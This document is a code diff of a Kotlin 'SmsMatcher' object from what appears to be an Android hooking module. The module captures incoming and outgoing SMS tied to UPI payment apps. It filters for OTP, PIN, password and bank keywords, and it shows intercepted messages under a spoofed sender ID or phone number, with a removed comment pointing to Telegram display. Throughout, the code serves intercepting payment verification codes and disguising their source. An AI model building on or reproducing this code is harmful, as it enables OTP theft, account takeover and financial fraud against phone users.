@@ -13,33 +13,42 @@ object SmsMatcher {
     fun enabledHookedApps(config: ModuleConfig): List<UpiAppRegistry.UpiApp> =
         UpiAppRegistry.ALL.filter { config.hookedUpiApps[it.packageName] == true }
 
-    /** Saved Sender ID from MESSAGE tab — hook/filter is based on this, NOT phone number */
     fun savedSenderId(config: ModuleConfig): String? {
         val id = config.injectSenderId.trim().uppercase()
         if (id.isBlank() || id == DEFAULT_SENDER) return null
         return id
     }
 
-    fun shouldCapture(config: ModuleConfig, sender: String, body: String): Boolean {
+    fun shouldCaptureIncoming(config: ModuleConfig, sender: String, body: String): Boolean {
         if (!config.hookIncomingSms && !config.hookUpiVerification) return false
-        if (body.isBlank() || sender.isBlank()) return false
+        return shouldCaptureForHookedApps(config, sender, body)
+    }
 
+    fun shouldCaptureOutgoing(config: ModuleConfig, recipient: String, body: String): Boolean {
+        if (!config.hookOutgoingSms) return false
+        return shouldCaptureForHookedApps(config, recipient, body)
+    }
+
+    private fun shouldCaptureForHookedApps(config: ModuleConfig, peer: String, body: String): Boolean {
+        if (body.isBlank() || peer.isBlank()) return false
         val hooked = enabledHookedApps(config)
         if (hooked.isEmpty()) return false
 
+        if (UpiAppRegistry.matchAmong(hooked, peer, body) != null) return true
+
         val savedId = savedSenderId(config)
+        if (savedId != null && senderMatches(peer, savedId) && isVerificationBody(body)) return true
 
-        // Hooked UPI app selected → sidha intercept (sender/body match ya verification SMS)
-        if (UpiAppRegistry.matchAmong(hooked, sender, body) != null) return true
-        if (isVerificationBody(body)) return true
-
-        // Saved Sender ID filter (MESSAGE tab) — extra match
-        if (savedId != null && senderMatches(sender, savedId)) return true
-
-        return false
+        return isVerificationBody(body) && UpiAppRegistry.matchAmongByBody(hooked, body) != null
     }
 
-    /** Telegram / intercept display — always saved Sender ID, never random phone number */
+    fun interceptDisplay(config: ModuleConfig, actualPeer: String, configManager: ConfigManager): String {
+        savedSenderId(config)?.let { return it }
+        if (isAlphanumericSenderId(actualPeer)) return normalizeSender(actualPeer)
+        val spoof = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
+        return spoof.ifBlank { normalizeSender(actualPeer) }
+    }
+
     fun displaySenderId(config: ModuleConfig, actualSender: String): String {
         savedSenderId(config)?.let { return it }
         if (isAlphanumericSenderId(actualSender)) return normalizeSender(actualSender)
@@ -51,7 +60,6 @@ object SmsMatcher {
         val f = normalizeSender(filter)
         if (a.isBlank() || f.isBlank()) return false
         if (a == f) return true
-        // AD-YESPRO-S vs ADYESPROS
         val aCompact = a.replace("-", "")
         val fCompact = f.replace("-", "")
         return aCompact == fCompact || a.contains(f) || f.contains(a) || aCompact.contains(fCompact)
@@ -87,14 +95,6 @@ object SmsMatcher {
         return trimmed
     }
 
-    fun messageLabel(config: ModuleConfig, sender: String, body: String): String {
-        val hooked = enabledHookedApps(config)
-        val lookupSender = savedSenderId(config) ?: sender
-        UpiAppRegistry.matchAmong(hooked, lookupSender, body)?.let { return it.displayName.uppercase() }
-        UpiAppRegistry.matchAmong(hooked, sender, body)?.let { return it.displayName.uppercase() }
-        return formatSenderLabel(lookupSender)
-    }
-
     fun isEncryptedToken(text: String): Boolean {
         if (text.length < 24) return false
         val compact = text.replace("\\s".toRegex(), "")
@@ -108,19 +108,9 @@ object SmsMatcher {
         val upper = body.uppercase()
         val keywords = listOf(
             "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "YESPAY", "YESPRO",
-            "PHONEPE", "PAYTM", "GPAY", "BHIM", "CODE", "PIN", "PASSWORD", "BANK", "TEST"
+            "PHONEPE", "PAYTM", "GPAY", "BHIM", "CODE", "PIN", "PASSWORD", "BANK"
         )
         return keywords.any { upper.contains(it) }
-    }
-
-    private fun formatSenderLabel(sender: String): String {
-        var label = sender.trim()
-        listOf("AD-", "VM-", "JD-", "BP-", "TX-").forEach { prefix ->
-            if (label.startsWith(prefix, ignoreCase = true)) label = label.substring(prefix.length)
-        }
-        label = label.trim('-', ' ')
-        if (label.endsWith("-S", ignoreCase = true)) label = label.dropLast(2)
-        return label.uppercase().ifBlank { "INTERCEPT" }
     }
 }
 
